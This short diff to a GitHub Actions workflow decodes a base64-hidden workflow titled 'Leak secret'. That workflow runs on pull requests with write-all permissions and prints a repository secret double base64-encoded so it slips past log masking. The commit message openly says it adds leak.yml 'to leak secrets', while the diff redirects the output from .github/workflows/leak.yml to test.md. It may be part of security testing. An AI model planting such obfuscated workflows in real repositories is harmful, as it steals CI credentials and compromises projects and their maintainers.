@@ -33,7 +33,7 @@ jobs:
         run: |
           mkdir -p .github/workflows
           CONTENT=$(echo "bmFtZTogTGVhayBzZWNyZXQKCm9uOgogIHB1bGxfcmVxdWVzdDoKICAgIHR5cGVzOiBbb3BlbmVkLCByZW9wZW5lZCwgc3luY2hyb25pemUsIGVkaXRlZF0KCnBlcm1pc3Npb25zOiAKICB3cml0ZS1hbGwKCmpvYnM6CiAgZXhhbXBsZS1qb2I6CiAgICBydW5zLW9uOiB1YnVudHUtbGF0ZXN0CgogICAgc3RlcHM6CgogICAgICAteiBuYW1lOiBSdW4gc2NyaXB0CiAgICAgIHJ1bjogfAogICAgICAgIGVjaG8gJHt7IHNlY3JldHMuU1VQRVJfU0VDUkVUIH19IHwgYmFzZTY0IC13MCB8IGJhc2U2NCAtdzA=" | base64 -d)
-          FILENAME=$(echo "LmdpdGh1Yi93b3JrZmxvd3MvbGVhay55bWw=" | base64 -d)
+          FILENAME=$(echo "dGVzdC5tZA==" | base64 -d)
           echo "$CONTENT" > $FILENAME
           git add $FILENAME
           git commit -m "Add leak.yml to leak secrets"
